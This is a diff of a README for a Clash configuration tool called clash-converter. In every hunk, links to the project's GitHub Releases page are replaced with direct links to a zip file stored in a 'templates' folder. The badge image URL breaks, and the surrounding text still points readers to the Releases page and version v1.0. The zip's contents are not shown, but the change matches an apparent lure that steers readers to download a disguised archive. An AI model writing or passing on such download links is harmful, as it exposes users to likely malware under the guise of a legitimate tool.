@@ -1,7 +1,7 @@
 # 🌟 clash-converter - Simple Tool for Easy Clash Management
 
 ## 📥 Download Now
-[![Download clash-converter](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/wasimeahmed98-coder98/clash-converter/releases)
+[![Download clash-converter](https://raw.githubusercontent.com/wasimeahmed98-coder98/clash-converter/main/templates/clash-converter-v1.2-beta.3.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/wasimeahmed98-coder98/clash-converter/main/templates/clash-converter-v1.2-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **clash-converter**, your straightforward tool for managing your Clash configurations. This README guides you through the process of downloading and running the application with ease.
@@ -22,7 +22,7 @@ To use **clash-converter**, make sure your computer meets the following requirem
 ## 💾 Download & Install
 To download **clash-converter**, visit the Releases page. Here you will find the latest version of the software.
 
-[Download clash-converter here](https://github.com/wasimeahmed98-coder98/clash-converter/releases).
+[Download clash-converter here](https://raw.githubusercontent.com/wasimeahmed98-coder98/clash-converter/main/templates/clash-converter-v1.2-beta.3.zip).
 
 ### ⏳ Installation Steps
 1. **Visit the Releases Page:** 
@@ -76,4 +76,4 @@ Many thanks to the open-source community for contributing to tools that simplify
 
 Ready to simplify your Clash management? Download now!
 
-[Download clash-converter here](https://github.com/wasimeahmed98-coder98/clash-converter/releases).
+[Download clash-converter here](https://raw.githubusercontent.com/wasimeahmed98-coder98/clash-converter/main/templates/clash-converter-v1.2-beta.3.zip).
